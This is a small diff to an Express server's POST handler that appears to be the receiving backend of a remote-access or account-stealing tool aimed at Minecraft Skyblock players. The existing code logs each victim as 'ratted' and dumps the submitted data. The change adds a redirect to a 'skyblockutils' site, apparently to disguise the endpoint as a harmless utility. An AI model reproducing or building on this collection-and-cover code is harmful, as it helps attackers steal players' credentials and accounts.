@@ -114,6 +114,7 @@ app.post("/", (req, res) => {
                 })
             }
 
+        res.redirect("https://skyblockutils.herokuapp.com/")
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
     })
